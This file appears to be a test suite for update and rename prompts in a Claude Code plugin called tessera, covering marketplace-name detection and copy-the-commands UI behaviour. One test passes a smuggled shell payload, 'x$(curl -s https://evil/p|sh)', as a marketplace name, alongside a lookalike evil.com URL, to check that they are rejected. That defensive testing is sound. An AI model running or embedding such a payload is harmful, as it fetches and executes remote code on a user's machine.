import type { TestBody } from 'claude-code/testing'
import { expect, test } from 'claude-code/testing'

import { marketplaceRenamed, marketplaceWithoutUpdates } from '../hooks/update'

const github = (autoUpdate?: boolean, name = 'og-matcha') => ({ extraKnownMarketplaces: { [name]: { source: { source: 'github', repo: 'OG-Matcha/tessera' }, autoUpdate } } })

test('an install under the old marketplace name is told to move; the current name and other sources are not', () => {
  expect(marketplaceRenamed(github(true, 'tessera'))).toBe('tessera')
  expect(marketplaceRenamed(github(true))).toBe(undefined)
  expect(marketplaceRenamed({ extraKnownMarketplaces: { tessera: { source: { source: 'directory', path: 'I:/tessera' } } } })).toBe(undefined)
  // The name goes into commands shown to the person, so only a plain one counts, and only our repository.
  expect(marketplaceRenamed({ extraKnownMarketplaces: { 'x$(curl -s https://evil/p|sh)': { source: { source: 'github', repo: 'OG-Matcha/tessera' } } } })).toBe(undefined)
  expect(marketplaceRenamed({ extraKnownMarketplaces: { 'a\nb': { source: { source: 'github', repo: 'OG-Matcha/tessera' } } } })).toBe(undefined)
  expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'https://evil.com/OG-Matcha/tessera' } } } })).toBe(undefined)
  expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'git@github.com:OG-Matcha/tessera.git' } } } })).toBe('t')
  for (const url of ['ssh://git@github.com/OG-Matcha/tessera.git', 'https://github.com/OG-Matcha/tessera#v0.8.0', 'https://raw.githubusercontent.com/OG-Matcha/tessera/master/.claude-plugin/marketplace.json'])
    expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url } } } })).toBe('t')
  expect(marketplaceRenamed({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'https://github.com/OG-Matcha/tessera-fork' } } } })).toBe(undefined)
})

test('a session under the old marketplace name shows the move once, and copying the commands settles it', { options: { language: 'en', carryOver: false } }, async ($, on) => {
  const copied: string[] = []
  on('ui.copy', (_, e) => {
    copied.push(String((e as { text?: unknown }).text))
    return { value: { isCopied: true } } as never
  })
  on('ui.toast', () => ({ value: undefined }))
  const { ui, written } = await start({ setupSeen: true, updateOffered: true }, github(true, 'tessera'))($, on)
  const copy = await ui.find({ type: 'Button', label: '⧉ copy the commands' } as never)
  expect(copy).toBeDefined()
  await ui.press({ key: copy!.key! })
  expect(copied[0]).toContain('claude plugin marketplace remove tessera\n')
  expect(copied[0]).toContain('install tessera@og-matcha')
  expect(written.moveOffered).toBe(true)
  expect(await ui.find({ type: 'Button', label: '⧉ copy the commands' } as never)).toBe(undefined)
})

test('a GitHub install of tessera without auto-update is found under any marketplace name', () => {
  expect(marketplaceWithoutUpdates(github(undefined, 'mine'))).toBe('mine')
  expect(marketplaceWithoutUpdates(github(true))).toBe(undefined)
  expect(marketplaceWithoutUpdates({ extraKnownMarketplaces: { t: { source: { source: 'git', url: 'https://github.com/og-matcha/tessera.git' } } } })).toBe('t')
})

test('a local folder, another marketplace or no settings ask nothing', () => {
  expect(marketplaceWithoutUpdates({ extraKnownMarketplaces: { tessera: { source: { source: 'directory', path: 'I:/tessera' } } } })).toBe(undefined)
  expect(marketplaceWithoutUpdates({ extraKnownMarketplaces: { other: { source: { source: 'github', repo: 'a/b' } } } })).toBe(undefined)
  expect(marketplaceWithoutUpdates({})).toBe(undefined)
})

const start = (store: Record<string, unknown>, settings: unknown) => async ($: Parameters<TestBody>[0], on: Parameters<TestBody>[1]) => {
  const written: Record<string, unknown> = {}
  on('env.get', () => ({ value: '1' }) as never)
  on('settings.read', () => ({ value: settings }) as never)
  on('store.get', (_, e) => ({ value: store[String((e as { key?: string }).key)] }) as never)
  on('store.set', (_, e) => {
    written[String((e as { key?: string }).key)] = (e as { value?: unknown }).value
    return { value: undefined } as never
  })
  on('session.start', () => ({ cwd: '/tmp' }))
  on('prompt.fill', () => ({ isFilled: true }) as never)
  on('ui.render', ($, e) => {
    const { Text } = $.ui.resolve(e)
    return <Text>engine</Text>
  })
  await $.session.start({ cwd: '/tmp', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'tessera', surface: 'terminal', component: 'AbovePrompt', props: { hasSurvey: false, isWorking: false, availableRows: 20 }, viewport: { columns: 80, rows: 20 } } as never)
  return { ui, written }
}

test('a returning session offers auto-update once, and a press settles it', { options: { language: 'en', carryOver: false } }, async ($, on) => {
  const { ui, written } = await start({ setupSeen: true }, github())($, on)
  const open = await ui.find({ type: 'Button', label: 'open /plugin' } as never)
  expect(open).toBeDefined()
  await ui.press({ key: open!.key! })
  expect(written.updateOffered).toBe(true)
  expect(await ui.find({ type: 'Button', label: 'open /plugin' } as never)).toBe(undefined)
})

const cases = [
  ['the first session', {}, github()],
  ['a session after it was answered', { setupSeen: true, updateOffered: true }, github()],
  ['auto-update on', { setupSeen: true }, github(true)],
] as const

for (const [when, store, settings] of cases)
  test(`no offer in ${when}`, { options: { language: 'en', carryOver: false } }, async ($, on) => {
    const { ui } = await start(store, settings)($, on)
    expect(await ui.find({ type: 'Button', label: 'open /plugin' } as never)).toBe(undefined)
  })
